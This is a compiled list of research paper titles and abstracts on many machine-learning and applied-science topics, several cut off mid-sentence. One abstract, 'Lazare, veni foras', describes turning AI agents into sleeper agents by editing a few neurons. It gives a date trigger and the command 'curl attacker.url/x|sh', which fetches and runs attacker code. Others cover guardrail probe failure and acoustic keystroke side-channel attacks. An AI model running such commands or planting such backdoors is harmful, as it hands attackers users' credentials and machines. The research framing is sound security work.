title: Ship-as-a-buoy for Phase-resolved Reconstruction of Surface Waves
abstract: We develop a data assimilation framework to address the ``ship-as-a-buoy'' problem, i.e., estimation of the wave field from time series of ship motion. Unlike previous algorithms which only provide information of wave spectrum, our approach reconstructs the instantaneous phase-resolved wave field. The full framework includes two steps: the first step to generate an initial (rough) estimation of the wave field using the response-amplitude-operators (RAOs), and the second step to refine the reconstruction using an ensemble Kalman filter (EnKF) to incorporate the measured motion time series. title: World-Grounded Reinforcement Learning for Pollution-Aware Bird Movement Modeling Using a Multi-Instance DQN Framework
abstract: Birds are modeled as environmentally sensitive agents whose movement reflects real-world air quality conditions, where AQI serves as a measurable world feedback signal representing pollution-driven consequences. Instead of relying on human preference or synthetic rewards, the system uses environmental outcomes as the primary training signal, enabling policy learning grounded in ecological impact. We propose a multi-instance reinforcement learning simulation in which agents navigate a 2D grid representation of India integrated with a precomputed AQI matrix and geographic state boundaries. The f
institutions: Mohamed bin Zayed University of Artificial Intelligence

title: Evaluating Simplification Algorithms for Interpretability of Time Series Classification
abstract: In this work, we introduce metrics to evaluate the use of simplified time series in the context of interpretability of a TSC - a Time Series Classifier. Such simplifications are important because time series data, in contrast to text and image data, are not intuitively understandable to humans. These metrics are related to the complexity of the simplifications - how many segments they contain - and to their loyalty - how likely they are to maintain the classification of the original time series. We focus on simplifications that select a subset of the original data points, and show that these t

title: ReMoE: An Interpretable Mixture-of-Experts Framework for Human Mobility Recovery Forecasting Across Disasters
abstract: Human mobility often declines sharply following disasters and subsequently exhibits complex recovery dynamics. Effective forecasting of this recovery is critical for timely assessment and resource allocation. However, existing approaches are often developed for individual events and operate as black boxes, limiting their transferability and interpretability beyond the events they were trained on. Recent studies have identified recurring post-disaster mobility recovery types across disasters, suggesting that recovery knowledge may be transferable. Motivated by this, we propose ReMoE, an interpr

title: Large Language Models as Nonlinear Dynamical Systems: The Three Clocks of Depth, Training, and Generation
abstract: Language models are dynamical systems. A transformer is iterated over its layers, over the steps of its training and over the tokens it generates, and on each of these three clocks it shows behavior that nonlinear dynamics has studied for a century: fixed points, bifurcations, synchronization, chaos and noise-driven escape from potential wells. The two communities rarely meet, so this behavior is often rediscovered under new names. We build a bridge between them. title: Rank2Replace: VLM-Ranked Slot Replacement for Out-of-Distribution Generalization
abstract: Spurious correlations can give image predictors high in-distribution accuracy but poor generalization under distribution shift. We introduce $\textbf{Rank2Replace}$, which transfers knowledge of task-relevant evidence from pretrained vision--language models (VLMs) to small predictors through training-time augmentation for out-of-distribution (OOD) generalization. The VLM ranks object-centric slots by task relevance and guides rank-dependent replacement with same-rank slot embeddings from another image. This augmentation retains the original image's label, encouraging reliance on preserved task

title: Tabular Foundation Models as Emulators for Forecasting Terrestrial Ecosystem Dynamics
abstract: Process-based terrestrial biosphere models such as the Ecosystem Demography (ED) model underpin global carbon budgets, but their cost limits global, high-resolution and scenario-rich simulation. Deep emulators such as DeepED reduce that cost but require task-specific architectures and training. Tabular foundation models offer a different route: TabPFN predicts new rows by in-context learning, without being trained on the task. institutions: Rutgers, The State University of New Jersey

title: Where slide-level foundation-model classifiers fail on atypical breast lesions
abstract: Whether a ductal breast lesion is called atypical hyperplasia or low-grade carcinoma in situ increasingly determines surgery. However, slide-level classifiers built on pathology foundation models (PFMs) perform worst on these lesions. Using four PFMs, cross-validation on BRACS and preregistered hypotheses, we studied where the classification of atypia fails. Because slides are labelled with their most severe lesion, only 39% of the slides with annotated atypical ductal hyperplasia (ADH) were labelled ADH. Attention ranked the lesion high but rarely first, and showing the model only the lesion

title: Non-Imaging Optical Tactile Sensors for Robotics: Transduction Principles, System Integration, and Robotic Applications
abstract: Non-imaging optical tactile sensors encode contact through changes in optical intensity, wavelength, spectra, or photon counts, offering diverse architectures for robotic touch. Their usefulness depends on whether contact variables can be reliably distinguished from coupled mechanical and environmental effects, and whether the resulting information can be delivered in time to guide action. This review develops a unified framework linking mechanical load transmission, optical encoding, readout, and tactile inference to robotic task requirements. It examines reflective and waveguide-based device

title: CODE-PIF: Convex/Deep (CODE) Multiview Pseudoinvariant Features for Multitemporal Multispectral Surface Reflectance Imagery
abstract: Multitemporal multispectral surface reflectance imagery exhibits radiometric and spectral variability due to atmospheric effects, sensor differences, and actual surface changes, complicating the identification of pseudoinvariant features (PIFs). The SOTA DeepMGCCA captures nonlinear dependencies across acquisition dates, but similarity in its learned feature space does not directly establish consistency in the original reflectance domain. title: Methodological Pitfalls in Predicting Ship Turnaround Time at Brazilian Ports: An Empirical Audit and a Reproducible Pipeline
abstract: Two recent studies on ship turnaround time at Brazilian ports report models with R-squared scores above 0.80 on data from the national waterway transportation agency. We audit their published datasets and reveal these results are inflated by structural data leakage. Specifically, 97 percent of berthing events in their random row-level split appear in both training and testing partitions. We demonstrate that a model's R-squared drops from 0.82 to 0.20 when the data is properly split at the berthing level. We further document additional methodological flaws, including survivorship bias, undocume

title: HIFC-IQA: Train-Free Cross-Domain Image Quality Assessment via Dual-Process Cognition
abstract: The gap between controlled synthetic distortions and complex real-world degradations introduces a critical domain shift challenge for No-Reference Image Quality Assessment. Although Unsupervised Domain Adaptation (UDA) approaches attempt to address this issue, they remain constrained by substantial retraining overhead and cumulative error propagation inherent in iterative pseudo-labeling. Inspired by the dual-process theory of human cognition for remarkable generalization ability, we propose Hierarchical Intuitive and Fuzzy Consensus (HIFC), a completely train-free Cross-Domain IQA framework.

title: Identifying Latent Neural Dynamics with Recognition-Parametrised Gaussian Process Dynamical Systems
abstract: Neural circuits are densely interconnected systems, and many neural computations are thought to be mediated by the dynamical evolution of activity within these recurrent networks, a hypothesis often referred to as "computation through dynamics". Under this view, understanding computation within real neural populations depends on building models of the dynamical rules governing the temporal evolution of recorded high-dimensional neural activity. title: NVIDIA Kumo Tabular: Pushing the Accuracy-Efficiency Frontier for Tabular Prediction
abstract: We introduce Kumo Tabular, a family of open tabular foundation models for classification and regression, in three sizes: Kumo Tabular-S (27M parameters), Kumo Tabular-M (61M), and Kumo Tabular-L (214M). Pretrained only on artificial tables from the Kumo prior, they can make predictions on new tables without any training. In our approach, a table encoder compresses each row into an embedding, and an in-context learning transformer predicts the unlabeled rows from the labeled ones. title: ORCAS: orthogonal representation for compression of distributed acoustic sensing
abstract: Distributed Acoustic Sensing (DAS) turns standard fiber-optic cables into dense virtual sensor arrays. Using Rayleigh backscattering of coherent laser pulses, DAS measures vibrations and strain over 100 km with meter-scale resolution and is well suited to remote seismic sensing, pipeline leak detection, and infrastructure protection, where conventional point sensors are too costly or impractical. This high temporal and spatial resolution generates massive data volumes, creating major processing and storage challenges that demand optimized compression algorithms. title: Satellite Pretraining Is Not One Thing: A Matched-Pair Study of Generic and Earth-Observation Foundation Models for Scene Classification
abstract: Geospatial foundation models are pretrained on satellite and aerial imagery, but whether such an encoder beats a strong generic one for few-label land-use/land-cover mapping remains unclear, as prior comparisons rarely isolate the pretraining data. We study five matched pairs of Earth-observation (EO) and generic encoders sharing objective and architecture (DINO/SatDINO, DINOv3/DINOv3-SAT, MAE/SatMAE, MAE/Scale-MAE, CLIP/RemoteCLIP) within a benchmark of 14 frozen encoders on five RGB scene-classification datasets (0.06-30 m GSD). With native preprocessing, we evaluate k-NN, linear and attenti

title: Enabling joint chemical and meteorological data assimilation with an atmospheric foundation model
abstract: The hydroxyl radical (OH) is the main oxidant in the troposphere and accounts for 88% of the methane sink, yet its abundance and trends remain poorly constrained. Satellites observe many of the chemical and meteorological drivers of OH, but assimilating both requires a model that represents chemistry and meteorology together. Existing chemistry-climate models are too expensive for joint data assimilation. Here, we present AuroraChem, a fine-tuned version of the Aurora atmospheric foundation model that jointly simulates meteorology and the GEOS-Chem chemical fields needed to constrain OH. A one

title: STAMP: Manufacturing-Informed Generative Design and Shape Optimization of Sheet Panels
abstract: Generative design of formed sheet panels must preserve geometric manufacturing conditions while exploring layouts and improving performance. STAMP embeds these conditions directly in the shape representation. Each panel is described by its material layout and a reference surface with one height at each occupied position in a plane perpendicular to the drawing direction. Nominal thickness is prescribed along the normal. The representation allows curved surfaces, ribs, and openings. institutions: Korea Advanced Institute of Science and Technology

title: A Time-Frequency-Condition Multimodal Fusion Foundation Model for Universal Rotating-Machinery Fault Diagnosis under Multi-Element Heterogeneous Scenarios
abstract: Intelligent fault diagnosis models are typically developed for a single machine under a specific set of operating conditions, such that each new machine or condition requires retraining from scratch. This one-machine-one-model paradigm scales poorly. Although transfer learning and domain generalization can reduce the labeling burden, they primarily seek domain-invariant commonality, potentially discarding machine-specific characteristics that are critical for diagnosis. title: Physics-Constrained Autoencoder for Interpretable Health Representation Learning in Turbofan Engines
abstract: Health Indices (HIs) summarize degradation from operational data and support diagnostic and prognostic tasks in Prognostics and Health Management (PHM). Their usefulness depends on capturing degradation and interpreting system condition. Autoencoders learn such representations from unlabelled monitoring data; however, when training is driven only by reconstruction, the physical meaning of latent variables remains undefined, limiting their interpretation and diagnostic value. institutions: ZHAW Zurich University of Applied Sciences

title: One Future Fits All: Text-to-image AI and the Narrowing of Global Imagination
abstract: Persistence of algorithmic bias is well established in scholarship, reflecting, reproducing and reshaping inequalities and injustices. Yet, as technology changes, we cannot assume that inequalities will be reproduced in the same or similar forms. This article explores the reproduction of bias in text-to-image generative AI, looking at the tool, Microsoft Bing Create, based on DALL E 3. It draws on results of a collaborative exploratory study of 907 image-based outputs of text-to-image generation in 15 languages and concerning 12 countries. title: SenseAlign: Learning Decision-Aligned Predictive Representations for Active Urban Sensing with UAVs
abstract: Active urban sensing orchestrates a mobile sensor fleet to proactively inspect a dynamic road network and gather critical information for system management. This problem simultaneously requires understanding the complex spatio-temporal evolution and making decisions with partial observations. In this work, we focus on active sensing in a large-scale urban road network with utilities grounded in dynamic traffic states, while prior work has rarely considered these factors jointly. We propose \emph{SenseAlign}, a Reinforcement Learning-based (RL) framework that learns decision-aligned predictive

title: SPIRE: Task-agnostic embodied continual learning through autonomous situation inference and causal motor-primitive reuse
abstract: Embodied continual learning requires controllers to infer changing situations, retain prior behavior and reuse motor skills without task labels or known boundaries. The challenge is deciding when to recover earlier behavior and which skills can support new learning. We introduce Situation-guided Primitive Integration for Recurrent Embodiment (SPIRE), a recurrent-spiking system that infers latent contexts from action-outcome evidence and learns context-specific motor actors online. institutions: University of Chinese Academy of Sciences

title: Transmission-Mode Multispectral Imaging for Estimation of Microcystis spp. Cell Concentration and ELISA-Equivalent Microcystin Concentration in Water
abstract: Harmful algal blooms dominated by Microcystis spp. threaten freshwater systems through proliferation and microcystin (MC) production. Conventional measurements of cyanobacterial abundance and MC concentration commonly require laboratory processing, specialized instrumentation, or assay reagents. Because MC concentration cannot always be reliably inferred from cell abundance, complementary optical approaches for estimating both quantities are of interest. title: PACER: GPU Excursion Management for ML Workloads
abstract: Variability is an inherent characteristic of modern GPU systems, arising from a combination of process variation, dynamic environmental conditions, and power management decisions. Prior work has characterized inter-GPU variability and found consistent performance differences across GPUs. However, we observe that modern workloads, particularly large language models (LLMs), exhibit significant intra-GPU variability. title: The Algebra of Narratives and the Monitoring of Their Relative Dominance
abstract: We propose an algebraic methodology for measuring the relative prevalence of competing narratives within a time-evolving corpus of texts. Standard cosine similarity between article embedding and narrative vectors fails to isolate the idiosyncratic contribution of each narrative, because narratives sharing a common topic produce strongly correlated vector representations. title: DynSurvX: Time-Resolved Explanations for Dynamic Survival Predictions
abstract: Recent survival models integrating longitudinal data achieve strong predictive performance, but their predictions are often difficult to interpret, limiting their clinical use. We propose DynSurvX, a model-agnostic explainability framework for dynamic survival prediction with mixed static and longitudinal covariates. Based on Shapley values, DynSurvX introduces a hierarchical two-phase strategy that first identifies influential longitudinal features and then adaptively refines their temporal importance, enabling fine-grained explanations while reducing computational cost. institutions: Heka : Méthodes basées sur les données et modèles en santé pour l'acquisition de connaissances

title: Score-Based Stochastic Closure Modeling via Offline Indirect Learning and Online Data Assimilation
abstract: Stochastic closure modeling is an emerging area in reduced-order modeling of large and complex (e.g., multiscale, multi-physics) systems, for which the computationally affordable reduced-order physical descriptions (e.g., digital twins for additive manufacturing, world models for AI agents) in numerical simulations inevitably lead to information losses that cannot be well addressed by classical deterministic closures. title: Computing Optimal Non-stationary Policies for the Probabilistic Reach-Avoid Problems
abstract: We develop and analyze an algorithm for computing optimal non-stationary policies for probabilistic reach-avoid problems. The objective in probabilistic reach-avoid problems is to maximize the probability of reaching a goal without visiting predefined avoid states. Prior work has focused on computing optimal stationary reach-avoid policies. Stationary policies use the same action distribution whenever a given state is visited. title: CertiSum: Bitwise-Identical MXFP4 Training Across Platforms and Parallelism Layouts
abstract: Training with MXFP4, a 4-bit microscaling format, is non-deterministic: identical inputs can produce different results across parallelism layouts and GPU vendors. These differences complicate debugging and training audits and can cause training and inference engines to disagree. We present CertiSum to make MXFP4 training bitwise invariant across runs, parallelism layouts, and GPU vendors. title: Assessing Vision-Language Models for Early Prediction of Unsafe Situations in Robotics
abstract: Vision-Language Models (VLMs) process visual information and textual instructions and, by using their ability to understand and reason about context, are well-suited for predicting robot failures before they occur. However, evidence supporting this remains limited. To address this, we present an empirical evaluation of VLMs for predicting robot failures. title: Event-Based Person Detection for Maritime UAV Search
abstract: Maritime search and rescue requires locating people in the water quickly, motivating the use of UAVs to survey the search area. During flight, camera motion and the longer exposures used in low light can blur small targets and hinder person detection. Event cameras record brightness changes as they occur, reducing the motion blur associated with longer exposure times. We investigate their use for maritime person detection by generating synthetic events using the v2e event simulator from public MOBDrone rescue videos and retaining the existing annotations. title: When Should Deployed BCI Decoders Adapt? A Resource-Priced Ladder for Frozen EEG Trunks
abstract: When should a deployed MI decoder spend adaptation resources-not only how to adapt under shift? We study a thin control layer outside a frozen encoder: a resource ladder (factory -> Bayesian head -> affine map, with full fine-tune as an escape hatch) governed by regime-aware gating under a utility that prices accuracy, fit time, and label cost. title: Vibe Coding XR: Accelerating AI + XR Prototyping with XR Blocks and Gemini
abstract: While large language models (LLMs) have accelerated traditional software development through intent-driven “vibe coding”, prototyping intelligent Extended Reality (XR) experiences remains a major challenge. The fundamental barrier is not just the steep learning curve for human creators, but that low-level sensor APIs and complex game engine hierarchies are ill-suited for LLM reasoning, routinely exceeding context windows and inducing syntax hallucinations. title: Operating-Point Failure of Frozen Guardrail Probes Under Backbone Updates
abstract: We freeze a guardrail probe and threshold, then measure its operating point across 18 cells covering 16 public language-model updates. At a 1% target, the threshold fails closed in 8 of 9 cells in the first phase and either fails closed or open in 3 of 9 cells in a registered second phase (descriptive). The two phases also differ in update type and input format. The largest increase is from 1.01% to 15.12%, while the area under the receiver operating characteristic curve changes by no more than 0.0058 in any of these cells. title: Relaxing Cross-Modal Correspondence for Multimodal Remote Sensing Pretraining
abstract: Multimodal remote sensing pretraining commonly relies on exact instance-level correspondence across modalities, implicitly treating strictly paired observations as a prerequisite for learning transferable representations. In this work, we revisit this assumption by relaxing cross-modal correspondence from the instance level to the semantic level. We introduce Semantic Pairing (SemPair), a pairing-relaxed pretraining strategy that replaces exact instance pairs with class-consistent cross-instance pairs. title: Reliable Tree Recruitment from Scarce Annotations for Forest Inventory Expansion
abstract: Species-level inventories of individual tree crowns (ITCs) from UAV imagery are limited by annotation cost: in tropical forests, many species are represented by only a handful of field-validated crowns. We propose a reliable tree recruitment framework that expands a small annotated inventory by iteratively self-training a multi-task DeepLabV3 network, combining semantic segmentation with a crown-distance regression head, on RGB UAV orthomosaics. title: Washout-free synchronization, parameter estimation and uncertainty quantification of echo state networks
abstract: Echo state networks (ESNs) forecast chaotic systems for several Lyapunov times. Like all recurrent networks, ESNs require a washout before forecasting, i.e., a phase in which the full state drives the network until the reservoir state synchronizes with the system. At deployment, however, sensors measure only part of the state, with noise and at a lower sampling rate than the training data. title: SailSearch: Agent-Assisted Discovery in Combinatorial Optimization
abstract: We present SailSearch, a human-guided workflow for algorithmic research with two language-model agents, and report results on Market Split and maximum independent set (MIS). For Market Split, our randomized algorithm searches across multiple lattice bases, dividing computation between enumeration and continued basis reduction. Across ten random seeds per instance, it found the first reported CPU-only solutions to 18 of 33 previously open QOBLIB instances, solving 130 to 133 of the 156 benchmark instances per seed with a 24-hour cutoff on two CPU cores. title: Learning inadequacy of Bayesian neural operators for PDE-constrained inference and design
abstract: Partial differential equations (PDEs) underpin predictive modeling across science, engineering and medicine. Their use in digital twins, parameter inference and optimal design requires repeated solutions across parameters and scenarios. For nonlinear, transient and multiphysics systems, these calculations can make numerical simulation prohibitively expensive. title: Honest Fusion Evaluation for Cross-Domain Deepfake Detection: Leakage Audits and Tail Robustness
abstract: Cross-domain video deepfake detection increasingly uses frozen foundation-model experts, combined by calibrated score averaging, a per-video router picking one expert, or a learned head over concatenated features. Expressive routing and feature fusion are often reported to beat plain averaging. Across a 22-dataset frozen-expert testbed, we find those gains are largely evaluation artifacts. title: Batten the Hatches: Cybersecurity with Military Mariners
abstract: Cyberwarfare has become a key component of contemporary geopolitical conflict. However, there has been extremely limited systematic investigation into how cybersecurity is handled by military organizations and personnel. The military context is unique compared to other operational ones, with immense resource availability (U.S. military spending approached 1 trillion dollars in 2024), a rigid chain of command, and extraordinary consequences for its actions. title: GPRidge: Gaussian-process Accelerated Calculations of Minimum Energy Paths and First-order Saddle Points
abstract: GPRidge, a Gaussian-process (GP) library for accelerating calculations of minimum energy paths and first-order saddle points with compiled-language and Python bindings, is presented. An evaluation controller uses GP predictions to iteratively adjust the Cartesian coordinates of the atoms. title: Repertoires of Contention: Building computational tools and infrastructures for community resistance to bitcoin mining
abstract: Recent work in human-computer interaction and allied fields has sought to engage community members as co-designers, facilitators, and decision makers to challenge structural power barriers and knowledge gaps. In this paper, we apply a diverse set of computational techniques to engage and address community concerns surrounding the socio-environmental impacts of the Greenidge Bitcoin mining power plant facility in upstate New York. title: Cat Royale Comprehensive Dataset: A Dataset for Pose Detection, Segmentation, Animal Action Recognition and Scene Understanding
abstract: Animal focused computer vision datasets are of a growing interest in the fields of both Computer Vision and Animal behaviour. The ability to make sense of complex scenes via a variety of Computer Vision tasks has substantial implications for behavioural understanding and welfare. The perfection of these tasks will help lead to better health and emotional outcomes for wild and domestic animals. title: Co-simulation-Based Safety-Assessment of Black-Box Maritime Cyber-Physical Systems
abstract: Modern maritime cyber-physical systems consist of tightly interconnected subsystems ranging from multiple engineering domains, making exhaustive safety verification impractical. Simulation-based testing offers a scalable alternative, while co-simulation enables heterogeneous subsystem models, potentially developed by different stakeholders, to be integrated without requiring access to their internal implementations. Adaptive Stress-Testing further improves testing efficiency by formulating failure discovery as a sequential decision-making problem, guiding the search toward the most likely fail
institutions: Norwegian University of Science and Technology

title: MARLIN: Multiscale And Directional Sparse Representation Learning for Imbalanced SAR Ship Classification
abstract: Despite recent progress in SAR maritime monitoring, ship classification remains challenging due to limited labeled data, class imbalance, large intra-class variability, fine-grained inter-class similarity, and variations in target scale, orientation, and backscattering structure. To address these challenges, this paper proposes MARLIN, a class-frequency-aware framework with directional sparse and hierarchical multi-scale feature extraction for ship type classification in SAR images. title: Hybrid Optimization-Generative Motion Planning for Multiagent Affine Formations
abstract: Formation maneuver control enables a multiagent system to cooperatively navigate through constrained environments in collective motion. While various formation controllers exist, they rely heavily on high-quality and dynamically feasible reference trajectories provided a priori, making formation motion planning (FMP) essential. To address the computational challenges for high-dimensional joint trajectories faced by conventional constrained optimization-based solutions, this paper introduces a hybrid optimization-generative framework with a focus on affine formations, which provide the necessar

title: When Does Oversampling Help? A Decision Framework for Imbalanced Data Streams Under Label Delay and Concept Drift
abstract: For imbalanced data streams with delayed labels, is it worth adding a streaming oversampler, or does continuous re-evaluation of earlier predictions already recover the cost of the delay? We address this through an extensive experimental comparison of streaming oversampling and continuous re-evaluation under joint class imbalance, concept drift, and label delay. Streaming oversamplers are typically evaluated under the test-then-train assumption of immediate labels; their behaviour under these conditions, assessed through re-evaluation, has not been systematically studied. title: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block,

title: Where Should a Diffusion Transformer Meet Its Teacher?
abstract: Representation Alignment (REPA) significantly accelerates Diffusion Transformer training by guiding intermediate student features with a pretrained visual teacher, yet existing methods typically attach supervision to a single fixed layer. As student representations evolve, however, we find that the most effective layer for alignment varies across training stages. title: FADO: Learning Causal Explanations with Prior-Fitted Networks
abstract: In regression and classification tasks with tabular datasets, most of the literature on explanation in ML (e.g. SHAP, permutation importance) has focused on predictive attribution: does feature $X_i$ help predict outcome $Y$? At its heart, predictive attribution captures correlation, not causation. We instead ask a causal question: would manipulating feature $X_i$ change outcome $Y$? We define a natural quantity to answer this question, the feature intervention effect: $Δ_i = E[Y\mid do(X_i=+1)]-E[Y\mid do(X_i=-1)]$. In general, estimating this quantity from observational data alone would enta

title: InvarOrd: Self-Supervised Ordinal Knowledge Distillation with Rank-Invariant Alignment for Label-Efficient Cross-Species Hyperspectral Fish Freshness Assessment
abstract: Hyperspectral models of fish freshness rarely transfer between species, and labelling a new species is slow and destructive. Freshness is also ordinal, and standard domain alignment can erase that order. We present InvarOrd, which adapts to a new species from 30 labelled cubes (5 per rank) in three stages: self-supervised spectral pretraining on unlabelled source cubes, cross-species alignment by a shrinkage covariance discrepancy computed only within matched ranks, and ordinal distillation into a compact student. title: Tree-Ising: Repairing Language Models with Bit-Level Ising Edits
abstract: Weight-space programming, introduced in recent MIT work by Takehi et al., enables a frontier LLM agent to read a network's weights and write a repair. Their GPT-6 Astra agent corrected the reasoning loops of Qwen3.5-0.8B without gradients, using 158 agent turns, 89.7 million tokens, and 50 forward-pass requests. Our method, Tree-Ising, casts this repair as a sparse discrete optimization problem over the model's own BF16 weights. Forward statistics define an objective that weakens a loop direction, strengthens a concluding direction, and preserves the layer's output on productive tokens. Within

title: Design of the Secure Smart Scooter with Automatic Lane Detection
abstract: The authors present a prototype of an electric scooter that uses computer vision to determine driving lanes and automatically modify vehicle configuration. Scooters steer on sidewalks, bike paths, or car lanes. The government imposes speed limits on the lanes in which electric scooters drive. Featuring computer vision, electric scooters can determine driving lanes and automatically modify vehicle configuration. However, such systems' safety is still a concern, and research into such vehicle systems' safety and security aspects is proceeding. First, we will present our vehicular setup. Then, we

title: Can Mechanistic Interpretability Help Explain LLM Agent Failures? A Case Study on Web Element Hallucination
abstract: Mechanistic Interpretability (MI) has made significant progress in explaining the internal computations of Large Language Models (LLMs); however, these advances have yet to demonstrate comparable success in explaining the decision-making processes of LLM-based agents. This paper examines the challenges MI tools face when applied to realistic agentic failures. We focus on one such failure: web agents hallucinating actions that are not available on a website. We apply a series of mechanistic analyzes to Qwen2.5-7B-Instruct as it interacts with live websites. We find that a linear probe trained o

title: Advancing global water cycle science with the upcoming MAGIC satellite mission through data assimilation
abstract: The GRACE and GRACE-FO missions provide unique global measurements of terrestrial water storage anomalies (TWSA) from space since 2003. However, in order to spatially downscale the GRACE/-FO resolution of 300 km further, and to vertically disaggregate TWSA into soil moisture, groundwater and other contributions, the TWSA observations were assimilated into hydrological and land surface models in the past while improving the realism of the models. title: SARVIA: Fast-Adapting the Strong SAR Foundation Models That Are Already in Your MLLMs
abstract: Synthetic aperture radar (SAR) foundation models provide transferable representations for diverse perception tasks in all-weather Earth observation. However, their development often relies on costly large-scale SAR pretraining, raising the question of whether such extensive domain-specific pretraining is necessary. We find that modern multimodal large language models (MLLMs) already provide visual encoders that can outperform dedicated SAR foundation models as downstream initializations. title: SURFACE: Preference Distribution Matching on Pareto Fronts via Scalarization Steering
abstract: Constructing a finite Pareto representation requires allocating a limited number of solutions across the Pareto front (PF). A desired preference distribution specifies this allocation by assigning more solutions to some PF regions and fewer to others. Scalarization generates Pareto solutions by varying objective weights and solving single-objective problems. title: Game-Theoretic Analysis of RIS-Assisted Challenge-Response PLA - Part I: Perfect Channel Knowledge
abstract: We consider a physical layer authentication scenario in which a legitimate user (Alice) communicates with an authen- ticator (Bob) through a reconfigurable intelligent surface (RIS), controlled by Bob. An attacker (Trudy) aims to impersonate Alice by suitably precoding her messages and still transmitting them through the RIS. This two-part study analyzes this attack-defense interaction between Bob and Trudy under perfect (Part I) and partial (Part II) channel knowledge by all the agents. title: A multi-fidelity dataset of two-dimensional steady laminar channel flow around obstacles
abstract: Surrogates that correct inexpensive flow simulations need the same flows solved at several fidelities and an estimate of the numerical error of the reference solutions. This dataset contains 4,500 two-dimensional, steady, laminar channel flows past a single obstacle. Each is solved in five numerical configurations: second-order convection on meshes with cell sizes of 2, 1, 0.5 and 0.25 mm, and first-order convection on the 1 mm mesh. title: Domain-Invariant and Language-Model-Assisted Acoustic Side-Channel Attacks on Keyboards
abstract: Acoustic side-channel attacks (ASCA) recover typed text from the sound of keystrokes, using only a commodity microphone and no access to the victim's device. Prior work establishes that such attacks succeed under idealized laboratory conditions - a single keyboard, a fixed microphone, a quiet room, and training and testing on the same device but leaves open the question that matters for security: whether keystroke inference survives the open world of unseen keyboards, diverse users, noisy environments, and compressed transmission channels. title: Physically Admissible Generative Flow Matching for Sparse Flow Reconstruction
abstract: Reconstructing full fluid velocity fields from sparse, localized observations is a severely ill-posed inverse problem: most of the spatial domain remains unobserved, discrete conservation laws must hold strictly, and predictive uncertainty must be reliable. Existing generative models typically enforce physical constraints only at the terminal output or via soft penalties, leaving intermediate generative trajectories unconstrained. We introduce Feasible Subspace Consistency (FSC), a framework that preserves physical admissibility as an invariant of continuous generative dynamics: tangent-space

title: MovieRoll: A Systematic Framework for Rolling Out Long-Form Videos
abstract: Streaming video generation must sustain quality beyond the training horizon while handling self-generated history and growing cache costs. To address these challenges, we present MovieRoll, a base-to-distilled framework that connects streaming fine-tuning, long-rollout distillation, and long-horizon inference. We first establish a robust multi-step base through Window-wise Teacher Forcing (WinTF), which jointly denoises chunks at progressive noise levels with bidirectional attention within each window and causal access to preceding history. institutions: Hong Kong University of Science and Technology

title: From Geographic Memory to Spatial Generalization in Large Language Models
abstract: Large language models (LLMs) can associate places with geographic descriptions, but recovering an observed association does not establish an ability to generalize across geographic space. We distinguish geospatial memory, the recovery of location--description associations observed during training, from spatial generalization, the prediction of descriptions for locations in unobserved regions. We investigate whether continuous location representations improve this generalization and encourage geographic knowledge to become spatially organized within an LLM. We frame this organization as a laten
institutions: University of Chinese Academy of Sciences

title: DnNP: Denoising Input Uncertainty in Neural Processes
abstract: Neural Processes (NPs) are flexible meta-learning models capable of uncertainty quantification across diverse applications. However, the standard NP framework assumes access to noise-free inputs. This is unrealistic in many practical settings, where sensor noise or measurement errors are unavoidable. This discrepancy between model assumptions and real-world data can significantly degrade prediction quality and uncertainty estimates. We introduce Denoising Neural Processes (DnNPs), a principled extension of the NP framework that explicitly models input uncertainty. We train DnNPs via variationa

title: Pressure Drop: Gravity Vector Estimation from a Distributed Barometric Pressure Sensor Array
abstract: While gravity is often used in mobile robotics as a global constraint for Simultaneous Localization and Mapping (SLAM) algorithms, most estimation methods rely on indirect observation of the gravity vector. In this paper, we propose the use of altimeter measurements to directly observe the direction of the gravity vector. We provide a theoretical evaluation of the estimation noise and validate it through extensive experimental data, along with an evaluation of the impact of intersensor distance on our gravity vector estimates. Experimental results demonstrate that a median error of $0.87^\circ

title: Communications-free Collective Intelligence Via Allocentric Belief
abstract: A team of skilled card players share no information amongst each other, and yet still are able to coordinate their play by watching the same players and reading the same tells. Autonomous systems have failed to exploit this logic, relying instead on explicit communication or complex state estimation schemes that can fail when it matters most. Without it, decentralized agents diverge in their world beliefs, and coordination collapses. Here we show that anchoring all agents to a single shared external actor, a common witness whose reactions encode team state, produces spontaneous, communication-

title: Auditing Learned Dynamics in Weather Models
abstract: Learned weather models are experimentally accessible computational systems whose internal representations can be inspected and manipulated. Using sparse autoencoder features from GraphCast, DeepMind's autoregressive weather forecasting model, we test whether causal relevance requires physical semantics, a question that matters for auditing whether AI forecasters used in high-assurance settings rely on reliable mechanisms. We also look at whether physically associated latent directions can be steered to improve extreme-event forecasts, where interventions are applied to the model's internal act

title: SAM 3 Sees More Than It Detects: Promptable Concept Maps Beyond Categories
abstract: Promptable segmenters answer what a thing is. Dense prediction tasks also ask class-agnostic questions, such as what stands out or hides, how light is blocked, transmitted or reflected, and where structure lies. Robots, surveillance systems and image editors build on their answers. We study promptable concept maps (PCM), which extend SAM 3's promptable concept segmentation from noun instances to maps of concepts named by short noun phrases such as `"transparent object", with "none" as an answer. title: Mamba Flow Matching Neural Processes: Linear-Time Inference for Irregularly Observed Spatial Fields
abstract: Interpolating a spatial field, such as daily maximum temperature, from sparse, irregularly located observations recurs across the environmental and health sciences. Standard Gaussian-process kriging refits hyperparameters and solves an $O(N^3)$ system for every new field. When many related fields are observed, such as daily maps from one sensor network, neural processes (NPs) instead learn the interpolation map from past fields and predict a new field in one forward pass. title: Sim-to-Real Powertrain Vibration Control via Model-Based Assisted Domain-Randomized Reinforcement Learning
abstract: Controllers designed from nominal models often degrade on mechanical systems with nonlinearities and parametric variations, such as automotive powertrains with backlash. Deep reinforcement learning (DRL) with domain randomization can acquire robustness to such model discrepancies, but wide randomization destabilizes training and yields conservative policies, and experimental transfer of such policies has rarely been demonstrated in vibration control. This paper presents model-based controller assisted domain randomization (MBCADR), a framework that integrates model-based control into domain-ra

title: SlowPerception: Physical-World Latency Attack against Camera-based Perception in Autonomous Driving
